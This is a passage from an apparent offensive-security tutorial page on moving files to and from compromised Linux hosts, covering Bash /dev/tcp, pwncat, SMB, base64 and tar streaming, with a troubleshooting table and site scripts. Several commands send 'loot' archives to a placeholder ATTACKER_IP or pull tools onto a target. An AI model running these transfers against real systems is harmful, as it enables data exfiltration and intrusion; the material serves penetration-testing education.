+<h3 id="bash-devtcp">Bash /dev/tcp</h3>
+<p>When Bash is present, its redirection handling can open a TCP socket without a separate networking utility.</p>
+<p>Download from attacker:</p>
+<p>Attacker:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ncat</span><span style="color:#79C0FF"> -l</span><span style="color:#79C0FF"> 9001</span><span style="color:#79C0FF"> --send-only</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF"> tool</span></span></code></pre>
+<p>Target:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">bash</span><span style="color:#79C0FF"> -c</span><span style="color:#A5D6FF"> 'cat &#x3C; /dev/tcp/&#x3C;ATTACKER_IP>/9001 > /tmp/tool'</span></span></code></pre>
+<p>Upload to attacker:</p>
+<p>Attacker:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ncat</span><span style="color:#79C0FF"> -l</span><span style="color:#79C0FF"> 9001</span><span style="color:#79C0FF"> --recv-only</span><span style="color:#FF7B72"> ></span><span style="color:#A5D6FF"> loot.tar.gz</span></span></code></pre>
+<p>Target:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">bash</span><span style="color:#79C0FF"> -c</span><span style="color:#A5D6FF"> 'cat /tmp/loot.tar.gz > /dev/tcp/&#x3C;ATTACKER_IP>/9001'</span></span></code></pre>
+<p>Using <code>bash -c</code> is deliberate. A reverse shell running as <code>/bin/sh</code> does not imply Bash semantics.</p>
+<details>
+<summary>What /dev/tcp actually is</summary>
+<p><code>/dev/tcp/&#x3C;host>/&#x3C;port></code> is easy to misread as a Linux device or filesystem path. In Bash it is special <strong>redirection syntax</strong>: when that pathname is used in a redirection, Bash attempts to open a TCP socket for the host and port.</p>
+<p>That distinction explains a common failure mode:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>/bin/sh: cannot create /dev/tcp/10.10.10.10/9001: Directory nonexistent</span></span></code></pre>
+<p>The shell may be <code>dash</code>, BusyBox <code>sh</code>, or another <code>/bin/sh</code> implementation that does not implement Bash’s special redirections. In that case there is normally no real <code>/dev/tcp</code> directory for the kernel to open.</p>
+<p>If Bash exists, invoke it explicitly:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> bash</span></span>
+<span class="line"><span style="color:#FFA657">bash</span><span style="color:#79C0FF"> -c</span><span style="color:#A5D6FF"> 'cat &#x3C; /dev/tcp/&#x3C;ATTACKER_IP>/9001 > /tmp/tool'</span></span></code></pre>
+<p>Bash itself can also be built without its network-redirection feature, although distribution builds commonly enable it. A failure here therefore says something about the shell capability, not necessarily about network reachability.</p>
+</details>
+<h2 id="existing-shell-handler">Existing shell handler</h2>
+<p>If the reverse shell is already managed by a tool that provides file transfer, reusing the current channel avoids opening another service or requiring additional target connectivity.</p>
+<h3 id="pwncat-cs">pwncat-cs</h3>
+<p>At the local pwncat prompt, upload:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>upload ./tool /tmp/tool</span></span></code></pre>
+<p>Download:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>download /tmp/loot.tar.gz ./loot.tar.gz</span></span></code></pre>
+<p>pwncat transfers the data over the same shell connection and locates usable readers or writers on the remote host. These are pwncat commands, not commands to type into the remote shell.</p>
+<p>The local working directory used by upload/download can be checked or changed with:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>lpwd</span></span>
+<span class="line"><span>lcd /path/to/engagement</span></span></code></pre>
+<h2 id="smb">SMB</h2>
+<p>A Linux host can also use an SMB share when TCP/445 is reachable and <code>smbclient</code> is available.</p>
+<h3 id="attacker-setup-1">Attacker setup</h3>
+<p>Anonymous temporary share:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">sudo</span><span style="color:#A5D6FF"> impacket-smbserver</span><span style="color:#A5D6FF"> share</span><span style="color:#A5D6FF"> .</span><span style="color:#79C0FF"> -smb2support</span></span></code></pre>
+<p>If guest access does not work, expose the share with credentials instead:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">sudo</span><span style="color:#A5D6FF"> impacket-smbserver</span><span style="color:#A5D6FF"> share</span><span style="color:#A5D6FF"> .</span><span style="color:#79C0FF"> -smb2support</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -username</span><span style="color:#A5D6FF"> transfer</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -password</span><span style="color:#A5D6FF"> 'TransferPass1!'</span></span></code></pre>
+<h3 id="download-with-smbclient">Download with smbclient</h3>
+<p>Anonymous:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">smbclient</span><span style="color:#A5D6FF"> //</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">/share</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -N</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -c</span><span style="color:#A5D6FF"> 'get tool /tmp/tool'</span></span></code></pre>
+<p>Authenticated:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">smbclient</span><span style="color:#A5D6FF"> //</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">/share</span><span style="color:#79C0FF"> -U</span><span style="color:#A5D6FF"> transfer</span></span></code></pre>
+<p>Then use:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>get tool /tmp/tool</span></span></code></pre>
+<h3 id="upload-with-smbclient">Upload with smbclient</h3>
+<p>Anonymous:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">smbclient</span><span style="color:#A5D6FF"> //</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">/share</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -N</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -c</span><span style="color:#A5D6FF"> 'put /tmp/loot.tar.gz loot.tar.gz'</span></span></code></pre>
+<p>Authenticated interactive session:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>put /tmp/loot.tar.gz loot.tar.gz</span></span></code></pre>
+<p><code>smbclient</code> transfers files in binary mode. Supplying the password interactively avoids embedding it in the shell history and process command line.</p>
+<h2 id="text-only-channels">Text-only channels</h2>
+<p>When the only reliable path is terminal text, binary content can be represented as text and reconstructed on the other side.</p>
+<h3 id="base64">Base64</h3>
+<p>Encode a small file on a GNU/Linux host as one line:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">base64</span><span style="color:#79C0FF"> -w</span><span style="color:#79C0FF"> 0</span><span style="color:#A5D6FF"> /tmp/loot.bin</span></span></code></pre>
+<p>If that implementation does not support <code>-w</code>, remove line breaks explicitly:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">base64</span><span style="color:#A5D6FF"> /tmp/loot.bin</span><span style="color:#FF7B72"> |</span><span style="color:#FFA657"> tr</span><span style="color:#79C0FF"> -d</span><span style="color:#A5D6FF"> '\n'</span></span></code></pre>
+<p>Reconstruct the file:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79C0FF">printf</span><span style="color:#A5D6FF"> '%s'</span><span style="color:#A5D6FF"> '&#x3C;BASE64_DATA>'</span><span style="color:#FF7B72"> |</span><span style="color:#FFA657"> base64</span><span style="color:#79C0FF"> -d</span><span style="color:#FF7B72"> ></span><span style="color:#A5D6FF"> /tmp/tool</span></span></code></pre>
+<p>For a multiline paste, a quoted here-document avoids shell interpolation:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">base64</span><span style="color:#79C0FF"> -d</span><span style="color:#FF7B72"> ></span><span style="color:#A5D6FF"> /tmp/tool</span><span style="color:#FF7B72"> &#x3C;&#x3C;</span><span style="color:#E6EDF3">'EOF'</span></span>
+<span class="line"><span style="color:#A5D6FF">&#x3C;BASE64_DATA></span></span>
+<span class="line"><span style="color:#E6EDF3">EOF</span></span></code></pre>
+<p>Base64 is binary-safe but increases the data size by roughly one third before line wrapping or transport overhead. It is therefore a useful fallback for small files, not a good default for a large archive.</p>
+<h3 id="hex-with-xxd">Hex with xxd</h3>
+<p>If <code>xxd</code> is available:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">xxd</span><span style="color:#79C0FF"> -p</span><span style="color:#A5D6FF"> /tmp/loot.bin</span><span style="color:#FF7B72"> |</span><span style="color:#FFA657"> tr</span><span style="color:#79C0FF"> -d</span><span style="color:#A5D6FF"> '\n'</span></span></code></pre>
+<p>Reconstruct:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79C0FF">printf</span><span style="color:#A5D6FF"> '%s'</span><span style="color:#A5D6FF"> '&#x3C;HEX_DATA>'</span><span style="color:#FF7B72"> |</span><span style="color:#FFA657"> xxd</span><span style="color:#79C0FF"> -r</span><span style="color:#79C0FF"> -p</span><span style="color:#FF7B72"> ></span><span style="color:#A5D6FF"> /tmp/tool</span></span></code></pre>
+<p>Hex is simple to inspect but doubles the binary size. <code>xxd</code> is also less universally installed than <code>base64</code>.</p>
+<h2 id="packaging-and-streaming-directories">Packaging and streaming directories</h2>
+<p><code>tar</code> is useful when the transfer contains multiple files or a directory tree.</p>
+<p>Create an archive on the Linux target:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">tar</span><span style="color:#A5D6FF"> czf</span><span style="color:#A5D6FF"> /tmp/loot.tar.gz</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -C</span><span style="color:#A5D6FF"> /var/tmp</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  evidence</span></span></code></pre>
+<p>Inspect it before transfer:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">tar</span><span style="color:#A5D6FF"> tzf</span><span style="color:#A5D6FF"> /tmp/loot.tar.gz</span></span></code></pre>
+<p>When disk space is limited, stream the archive directly instead of creating <code>/tmp/loot.tar.gz</code>.</p>
+<p>Attacker:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ncat</span><span style="color:#79C0FF"> -l</span><span style="color:#79C0FF"> 9001</span><span style="color:#79C0FF"> --recv-only</span><span style="color:#FF7B72"> ></span><span style="color:#A5D6FF"> loot.tar.gz</span></span></code></pre>
+<p>Target:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">tar</span><span style="color:#A5D6FF"> czf</span><span style="color:#A5D6FF"> -</span><span style="color:#79C0FF"> -C</span><span style="color:#A5D6FF"> /var/tmp</span><span style="color:#A5D6FF"> evidence</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#FF7B72">  |</span><span style="color:#FFA657"> ncat</span><span style="color:#79C0FF"> --send-only</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#79C0FF"> 9001</span></span></code></pre>
+<p>The same principle applies over SSH, as shown earlier. <code>tar</code> converts a directory tree into a byte stream; the transport can then be HTTP, SSH, Ncat, <code>nc</code>, or another binary-safe channel.</p>
+<h2 id="verification-and-troubleshooting">Verification and troubleshooting</h2>
+<p>A transfer is not complete merely because the client returned to the prompt. Check the result when integrity matters.</p>
+<h3 id="hashes">Hashes</h3>
+<p>Before transfer:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">sha256sum</span><span style="color:#A5D6FF"> tool</span></span></code></pre>
+<p>After transfer:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">sha256sum</span><span style="color:#A5D6FF"> /tmp/tool</span></span></code></pre>
+<p>Matching hashes confirm that both sides contain the same bytes.</p>
+<h3 id="file-type-and-permissions">File type and permissions</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ls</span><span style="color:#79C0FF"> -lh</span><span style="color:#A5D6FF"> /tmp/tool</span></span>
+<span class="line"><span style="color:#FFA657">file</span><span style="color:#A5D6FF"> /tmp/tool</span></span></code></pre>
+<p>For an executable:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">chmod</span><span style="color:#A5D6FF"> +x</span><span style="color:#A5D6FF"> /tmp/tool</span></span></code></pre>
+<p>A successful transfer followed by <code>Permission denied</code> or <code>Exec format error</code> is not automatically a transfer failure. Check the filesystem mount and binary architecture:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">findmnt</span><span style="color:#79C0FF"> -no</span><span style="color:#A5D6FF"> TARGET,OPTIONS</span><span style="color:#A5D6FF"> /tmp</span><span style="color:#FF7B72"> 2></span><span style="color:#A5D6FF">/dev/null</span></span>
+<span class="line"><span style="color:#FFA657">file</span><span style="color:#A5D6FF"> /tmp/tool</span></span>
+<span class="line"><span style="color:#FFA657">uname</span><span style="color:#79C0FF"> -m</span></span></code></pre>
+<p>A <code>noexec</code> mount or an architecture mismatch can prevent execution even when the file arrived intact.</p>
+<h3 id="common-failures">Common failures</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Symptom</th><th>Check</th></tr></thead><tbody><tr><td><code>curl</code> saves HTML instead of the expected file</td><td>Use <code>-f</code>; verify URL and receiver response</td></tr><tr><td><code>wget -c</code> produces unexpected content</td><td>Confirm the partial file belongs to the same remote object and the server supports ranges</td></tr><tr><td>HTTP upload returns 405/400</td><td>Confirm POST vs PUT and the expected body format</td></tr><tr><td>SSH login works but <code>scp</code> fails</td><td>Check SFTP availability; use <code>scp -O</code> only for legacy compatibility or use an SSH stream</td></tr><tr><td><code>/dev/tcp/...</code> reports a missing directory</td><td>Confirm that Bash is actually executing the redirection</td></tr><tr><td><code>nc</code> listener flags fail</td><td>Identify the netcat implementation; use Ncat on the operator side when possible</td></tr><tr><td>Raw TCP transfer never exits</td><td>Use Ncat <code>--send-only</code> / <code>--recv-only</code> or explicitly manage EOF</td></tr><tr><td>Hashes differ</td><td>Treat the transfer as partial/corrupt and repeat it</td></tr><tr><td>File transferred but will not execute</td><td>Check mode bits, <code>noexec</code>, architecture, and interpreter availability</td></tr><tr><td>Write fails in <code>/tmp</code> or another path</td><td>Check the current identity, permissions, free space, and choose another writable destination</td></tr></tbody></table>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://curl.se/docs/manpage.html">curl man page</a></li>
+<li><a href="https://www.gnu.org/software/wget/manual/html_node/Download-Options.html">GNU Wget manual — Download Options</a></li>
+<li><a href="https://man.openbsd.org/scp.1">OpenSSH scp manual</a></li>
+<li><a href="https://man.openbsd.org/sftp">OpenSSH sftp manual</a></li>
+<li><a href="https://docs.python.org/3/library/http.server.html">Python <code>http.server</code></a></li>
+<li><a href="https://github.com/Densaugeo/uploadserver">Densaugeo uploadserver</a></li>
+<li><a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html">Bash Reference Manual — Redirections</a></li>
+<li><a href="https://nmap.org/ncat/guide/ncat-file-transfer.html">Ncat Users’ Guide — File Transfer</a></li>
+<li><a href="https://rsync.samba.org/ftp/rsync/rsync.1.html">rsync manual</a></li>
+<li><a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">Samba <code>smbclient</code> manual</a></li>
+<li><a href="https://pwncat.readthedocs.io/en/latest/commands/upload.html">pwncat-cs — Upload</a></li>
+<li><a href="https://pwncat.readthedocs.io/en/latest/commands/download.html">pwncat-cs — Download</a></li>
+<li><a href="https://www.gnu.org/software/coreutils/manual/html_node/base64-invocation.html">GNU Coreutils — base64</a></li>
+<li><a href="https://man7.org/linux/man-pages/man1/socat.1.html">socat manual</a></li>
+</ul></div><nav class="notes-related" aria-label="Related notes"><strong>Related notes</strong><ul><li><a href="/en/notes/remote-access/"><span>Offensive Security / Shells</span>Remote Access</a></li><li><a href="/en/notes/windows-file-transfers/"><span>Offensive Security / File Transfer</span>Windows File Transfers</a></li></ul></nav></article><aside class="notes-toc" aria-label="On this page"><strong>On this page</strong><ul><li data-depth="2"><a href="#quick-reference">Quick reference</a></li><li data-depth="2"><a href="#http">HTTP</a></li><li data-depth="3"><a href="#attacker-setup">Attacker setup</a></li><li data-depth="3"><a href="#download">Download</a></li><li data-depth="3"><a href="#resuming-an-interrupted-download">Resuming an interrupted download</a></li><li data-depth="2"><a href="#http-upload">HTTP upload</a></li><li data-depth="3"><a href="#attacker-setup-with-uploadserver">Attacker setup with uploadserver</a></li><li data-depth="3"><a href="#upload-with-curl">Upload with curl</a></li><li data-depth="2"><a href="#ssh-and-sftp">SSH and SFTP</a></li><li data-depth="3"><a href="#scp">scp</a></li><li data-depth="3"><a href="#sftp">SFTP</a></li><li data-depth="3"><a href="#rsync-over-ssh">rsync over SSH</a></li><li data-depth="3"><a href="#streaming-through-ssh">Streaming through SSH</a></li><li data-depth="2"><a href="#raw-tcp">Raw TCP</a></li><li data-depth="3"><a href="#ncat">Ncat</a></li><li data-depth="3"><a href="#nc-on-a-constrained-target">nc on a constrained target</a></li><li data-depth="3"><a href="#socat">socat</a></li><li data-depth="3"><a href="#bash-devtcp">Bash /dev/tcp</a></li><li data-depth="2"><a href="#existing-shell-handler">Existing shell handler</a></li><li data-depth="3"><a href="#pwncat-cs">pwncat-cs</a></li><li data-depth="2"><a href="#smb">SMB</a></li><li data-depth="3"><a href="#attacker-setup-1">Attacker setup</a></li><li data-depth="3"><a href="#download-with-smbclient">Download with smbclient</a></li><li data-depth="3"><a href="#upload-with-smbclient">Upload with smbclient</a></li><li data-depth="2"><a href="#text-only-channels">Text-only channels</a></li><li data-depth="3"><a href="#base64">Base64</a></li><li data-depth="3"><a href="#hex-with-xxd">Hex with xxd</a></li><li data-depth="2"><a href="#packaging-and-streaming-directories">Packaging and streaming directories</a></li><li data-depth="2"><a href="#verification-and-troubleshooting">Verification and troubleshooting</a></li><li data-depth="3"><a href="#hashes">Hashes</a></li><li data-depth="3"><a href="#file-type-and-permissions">File type and permissions</a></li><li data-depth="3"><a href="#common-failures">Common failures</a></li><li data-depth="2"><a href="#references">References</a></li></ul></aside></div></div></div><script>
+    (() => {
+      const root = document.querySelector('.notes-page');
+      if (!root) return;
+      const tocLinks = [...root.querySelectorAll('.notes-toc a')];
+      const targets = tocLinks.map((link) => document.getElementById(decodeURIComponent(link.hash.slice(1)))).filter(Boolean);
+      const markCurrent = (link, active) => active ? link.setAttribute('aria-current', 'location') : link.removeAttribute('aria-current');
+      tocLinks.forEach((selected) => selected.addEventListener('click', () => tocLinks.forEach((link) => markCurrent(link, link === selected))));
+      if (targets.length) {
+        const updateActiveHeading = () => {
+          const active = targets.reduce((current, target) => target.getBoundingClientRect().top <= 150 ? target : current, targets[0]);
+          tocLinks.forEach((link) => markCurrent(link, link.hash === `#${active.id}`));
+        };
+        updateActiveHeading();
+        window.addEventListener('scroll', updateActiveHeading, { passive:true });
+      }
+    })();
+  </script></main><footer class="site-footer"><div class="footer-inner"><a class="footer-wordmark" href="/en/">dful<span>.</span></a><span>Offensive Security · AI Security · Agentic Systems</span></div></footer><script>
+  (() => {
+    const init = () => {
+      const figures = [...document.querySelectorAll('.publishing-prose .pub-figure[data-preview="true"]')];
+      if (!figures.length) return;
+
+      const spanish = document.documentElement.lang === 'es';
+      const labels = spanish
+        ? {
+            open: 'Abrir vista ampliada',
+            close: 'Cerrar vista previa',
+            zoom: 'Zoom de imagen',
+            fit: 'Ajustar',
+            actual: 'Tamaño real',
+          }
+        : {
+            open: 'Open enlarged preview',
+            close: 'Close preview',
+            zoom: 'Image zoom',
+            fit: 'Fit',
+            actual: 'Actual size',
+          };
+
+      let dialog = document.querySelector('dialog[data-figure-preview]');
+      if (!(dialog instanceof HTMLDialogElement)) {
+        dialog = document.createElement('dialog');
+        dialog.className = 'figure-preview-dialog';
+        dialog.setAttribute('data-figure-preview', 'true');
+        dialog.dataset.mode = 'fit';
+
+        const toolbar = document.createElement('div');
+        toolbar.className = 'figure-preview-toolbar';
+
+        const modeGroup = document.createElement('div');
+        modeGroup.className = 'figure-preview-modes';
+        modeGroup.setAttribute('role', 'group');
+        modeGroup.setAttribute('aria-label', labels.zoom);
+
+        const fit = document.createElement('button');
+        fit.type = 'button';
+        fit.className = 'figure-preview-mode';
+        fit.setAttribute('data-figure-preview-fit', 'true');
+        fit.setAttribute('aria-pressed', 'true');
+        fit.textContent = labels.fit;
+
+        const actual = document.createElement('button');
+        actual.type = 'button';
+        actual.className = 'figure-preview-mode';
+        actual.setAttribute('data-figure-preview-actual', 'true');
+        actual.setAttribute('aria-pressed', 'false');
+        actual.setAttribute('title', labels.actual);
+        actual.textContent = '1:1';
+
+        const close = document.createElement('button');
+        close.type = 'button';
+        close.className = 'figure-preview-close';
+        close.setAttribute('data-figure-preview-close', 'true');
+        close.setAttribute('aria-label', labels.close);
+        close.textContent = '×';
+
+        const viewport = document.createElement('div');
+        viewport.className = 'figure-preview-viewport';
+        viewport.setAttribute('data-figure-preview-viewport', 'true');
+
+        const image = document.createElement('img');
+        image.className = 'figure-preview-image';
+        viewport.appendChild(image);
+
+        const caption = document.createElement('p');
+        caption.className = 'figure-preview-caption';
+        caption.id = 'figure-preview-caption';
+
+        modeGroup.append(fit, actual);
+        toolbar.append(modeGroup, close);
+        dialog.append(toolbar, viewport, caption);
+        document.body.appendChild(dialog);
+
+        const setMode = (mode) => {
+          const native = mode === 'native';
+          dialog.dataset.mode = native ? 'native' : 'fit';
+          fit.setAttribute('aria-pressed', native ? 'false' : 'true');
+          actual.setAttribute('aria-pressed', native ? 'true' : 'false');
+          if (!native) viewport.scrollTo({ top: 0, left: 0 });
+        };
+
+        fit.addEventListener('click', () => setMode('fit'));
+        actual.addEventListener('click', () => setMode('native'));
+        close.addEventListener('click', () => dialog.close());
+        dialog.addEventListener('click', (event) => {
+          if (event.target !== dialog) return;
+          const rect = dialog.getBoundingClientRect();
+          const outside = event.clientX < rect.left || event.clientX > rect.right || event.clientY < rect.top || event.clientY > rect.bottom;
+          if (outside) dialog.close();
+        });
+        dialog.addEventListener('close', () => {
+          setMode('fit');
+          const trigger = dialog.dataset.lastTrigger;
+          const source = trigger ? document.querySelector(`[data-preview-trigger="${trigger}"]`) : null;
+          if (source instanceof HTMLButtonElement) source.focus();
+          delete dialog.dataset.lastTrigger;
+        });
+      }
+
+      const close = dialog.querySelector('[data-figure-preview-close]');
+      const fit = dialog.querySelector('[data-figure-preview-fit]');
+      const actual = dialog.querySelector('[data-figure-preview-actual]');
+      const previewImage = dialog.querySelector('.figure-preview-image');
+      const viewport = dialog.querySelector('[data-figure-preview-viewport]');
+      const caption = dialog.querySelector('.figure-preview-caption');
+      if (!(close instanceof HTMLButtonElement) || !(fit instanceof HTMLButtonElement) || !(actual instanceof HTMLButtonElement) || !(previewImage instanceof HTMLImageElement) || !(viewport instanceof HTMLDivElement) || !(caption instanceof HTMLParagraphElement)) return;
+
+      const largestSource = (image) => {
+        const candidates = (image.srcset || '')
+          .split(',')
+          .map((candidate) => candidate.trim())
+          .filter(Boolean)
+          .map((candidate) => {
+            const parts = candidate.split(/\s+/);
+            const descriptor = parts.length > 1 ? parts.pop() : '';
+            const url = parts.join(' ') || candidate;
+            let score = 0;
+            if (descriptor.endsWith('w')) score = Number.parseFloat(descriptor);
+            else if (descriptor.endsWith('x')) score = Number.parseFloat(descriptor) * (image.naturalWidth || 1);
+            return { url, score: Number.isFinite(score) ? score : 0 };
+          })
+          .sort((a, b) => b.score - a.score);
+        return candidates[0]?.url || image.currentSrc || image.src;
+      };
+
+      figures.forEach((figure, index) => {
+        const image = figure.querySelector('img');
+        if (!(image instanceof HTMLImageElement) || figure.querySelector('[data-preview-trigger]')) return;
+
+        const trigger = document.createElement('button');
+        trigger.type = 'button';
+        trigger.className = 'figure-preview-trigger';
+        const triggerId = `figure-preview-trigger-${index + 1}`;
+        trigger.setAttribute('data-preview-trigger', triggerId);
+        const alt = image.alt || (spanish ? 'Imagen técnica' : 'Technical image');
+        trigger.setAttribute('aria-label', `${labels.open}: ${alt}`);
+        image.parentNode?.insertBefore(trigger, image);
+        trigger.appendChild(image);
+
+        trigger.addEventListener('click', () => {
+          previewImage.src = largestSource(image);
+          previewImage.alt = alt;
+          const figureCaption = figure.querySelector('figcaption')?.textContent?.trim() || alt;
+          caption.textContent = figureCaption;
+          dialog.setAttribute('aria-label', alt);
+          dialog.setAttribute('aria-describedby', caption.id);
+          dialog.dataset.lastTrigger = triggerId;
+          dialog.dataset.mode = 'fit';
+          fit.setAttribute('aria-pressed', 'true');
+          actual.setAttribute('aria-pressed', 'false');
+          viewport.scrollTo({ top: 0, left: 0 });
+
+          if (typeof dialog.showModal === 'function') {
+            dialog.showModal();
+            close.focus();
+          }
+        });
+      });
+    };
+
+    init();
+    document.addEventListener('astro:page-load', init);
+  })();
+</script><script type="module">var e=()=>{document.querySelectorAll(`.pub-tabs:not([data-enhanced])`).forEach((e,t)=>{e.setAttribute(`data-enhanced`,`true`);let n=[...e.querySelectorAll(`:scope > .pub-tab`)];if(!n.length)return;let r=document.createElement(`div`);r.className=`pub-tab-list`,r.setAttribute(`role`,`tablist`),n.forEach((e,i)=>{let a=`pub-tab-${t}-${i}`,o=`pub-tab-panel-${t}-${i}`,s=document.createElement(`button`);s.type=`button`,s.id=a,s.className=`pub-tab-button`,s.setAttribute(`role`,`tab`),s.setAttribute(`aria-controls`,o),s.setAttribute(`aria-selected`,i===0?`true`:`false`),s.tabIndex=i===0?0:-1,s.textContent=e.getAttribute(`data-tab-label`)||`Tab ${i+1}`,e.id=o,e.setAttribute(`role`,`tabpanel`),e.setAttribute(`aria-labelledby`,a),e.toggleAttribute(`hidden`,i!==0),s.addEventListener(`click`,()=>{[...r.querySelectorAll(`[role="tab"]`)].forEach(e=>{e.setAttribute(`aria-selected`,e===s?`true`:`false`),e.tabIndex=e===s?0:-1}),n.forEach(t=>t.toggleAttribute(`hidden`,t!==e)),s.focus()}),s.addEventListener(`keydown`,e=>{let t=[...r.querySelectorAll(`[role="tab"]`)],n=t.indexOf(s),i=n;if(e.key===`ArrowRight`)i=(n+1)%t.length;else if(e.key===`ArrowLeft`)i=(n-1+t.length)%t.length;else 